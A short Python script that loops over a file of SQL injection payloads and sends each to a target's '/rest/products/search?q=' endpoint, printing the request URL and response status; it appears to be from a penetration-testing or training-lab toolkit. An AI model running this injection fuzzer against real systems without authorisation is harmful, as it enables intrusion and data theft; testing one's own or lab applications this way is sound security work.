
import requests

from plugins import attack as a

f = open('SQL_injection_payloads.txt','r')

while True:
    line = f.readline()
    if line:
        payload = a.URL+"/rest/products/search?q="+line
        print(payload)
        response = requests.get(payload)
        print(response.status_code)
    else:
        break
f.close()

